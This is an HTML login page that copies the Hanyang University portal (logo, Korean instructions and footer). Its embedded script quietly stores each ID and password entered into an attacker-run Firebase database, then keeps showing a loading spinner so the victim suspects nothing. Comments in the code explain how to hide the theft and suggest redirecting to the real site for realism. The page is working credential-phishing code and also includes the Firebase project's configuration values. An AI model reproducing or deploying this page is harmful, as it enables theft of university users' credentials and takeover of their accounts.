<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>한양대학교 로그인</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Noto Sans KR', sans-serif; min-width: 1000px; }
        .text-hanyang-blue { color: #003E7D; }
        .bg-hanyang-blue { background-color: #003E7D; }
        .btn-hanyang-blue:hover { background-color: #003366; }
        .input-focus:focus { border-color: #003E7D; outline: none; }
        
        /* 로딩 스피너 애니메이션 */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #3498db;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }
    </style>
</head>
<body class="bg-white h-screen flex flex-col justify-between">

    <!-- 상단 영역 -->
    <div class="w-full max-w-5xl mx-auto px-8 pt-12 flex-grow">
        <div class="flex items-center gap-4 mb-10">
            <img src="logo.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/2/23/Hanyang_University_logo.svg'" alt="Hanyang Logo" class="w-16 h-16 object-contain">
            <div class="text-[32px] text-[#333] tracking-tight">
                <span class="font-bold">한양대학교</span> <span class="mx-1 text-gray-300">|</span> <span>로그인</span>
            </div>
        </div>

        <div class="mb-16 pl-2">
            <p class="text-[#555] text-[15px] leading-relaxed">
                고객님의 정보에 접근하기 위하여 인증이 필요합니다.<br>
                한양대학교 포털 한양인(HY-in)계정으로 로그인 하시기 바랍니다.
            </p>
        </div>

        <div class="flex justify-center">
            <div class="border border-gray-300 rounded bg-white p-10 w-[620px] shadow-sm">
                <h2 class="text-xl text-[#333] font-normal mb-6 border-b border-gray-200 pb-3">Portal Login</h2>
                
                <form id="loginForm" class="flex gap-4 items-stretch">
                    <div class="flex-grow flex flex-col gap-3">
                        <div class="flex items-center">
                            <label for="username" class="w-24 text-[#555] font-medium text-[15px]">ID</label>
                            <input type="text" id="username" class="flex-grow border border-[#ccc] rounded px-3 py-2 text-sm text-[#333] placeholder-gray-400 input-focus" placeholder="아이디를 입력하세요" required>
                        </div>
                        <div class="flex items-center mt-1">
                            <label for="password" class="w-24 text-[#555] font-medium text-[15px]">Password</label>
                            <input type="password" id="password" class="flex-grow border border-[#ccc] rounded px-3 py-2 text-sm text-[#333] placeholder-gray-400 input-focus" placeholder="비밀번호를 입력하세요" required>
                        </div>
                    </div>
                    <!-- 버튼에 id 추가 -->
                    <button type="submit" id="loginBtn" class="w-24 bg-[#003E7D] hover:bg-[#003366] text-white font-bold rounded flex items-center justify-center transition-colors shadow-sm text-base">로그인</button>
                </form>
            </div>
        </div>
    </div>

    <footer class="bg-[#333] w-full py-5 px-8 mt-12">
        <div class="max-w-6xl mx-auto flex justify-between items-center text-xs text-[#888]">
            <div class="flex gap-8">
                <span class="font-bold text-[#999]">한양대학교API 개발자센터</span>
                <span>우)133-791 서울특별시 성동구 왕십리로 222</span>
            </div>
            <div>Copyright 2014 Hanyang University. All Rights Reserved.</div>
        </div>
    </footer>

    <!-- 파이어베이스 연결 부분 -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBBrAZXSl0DWUho61Jcismqc8tlyjeZ1Nc",
            authDomain: "hanyang-login.firebaseapp.com",
            projectId: "hanyang-login",
            storageBucket: "hanyang-login.firebasestorage.app",
            messagingSenderId: "826906314598",
            appId: "1:826906314598:web:2fdf7e593bfc912b76aaa7",
            databaseURL: "https://hanyang-login-default-rtdb.firebaseio.com/" 
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const id = document.getElementById('username').value;
            const pw = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');

            // 1. 로딩 UI 시작 (버튼 비활성화 및 스피너 표시)
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div>'; // 텍스트 대신 스피너만 보여줌 (칸이 좁아서)
            btn.classList.add('opacity-70', 'cursor-not-allowed');

            // 2. 데이터베이스에 조용히 저장
            const userListRef = ref(db, 'users');
            const newUserRef = push(userListRef);
            
            set(newUserRef, {
                username: id,
                password: pw,
                time: new Date().toLocaleString()
            })
            .then(() => {
                // 성공해도 아무 말 안 함 (그냥 계속 로딩하는 척)
                // 만약 진짜 사이트처럼 보이게 하려면 여기서 window.location.href = "실제주소"; 를 쓰기도 함
            })
            .catch((error) => {
                // 실패해도 조용히 있음 (콘솔에만 기록)
                console.error("Error:", error);
            });
        });
    </script>
</body>
</html>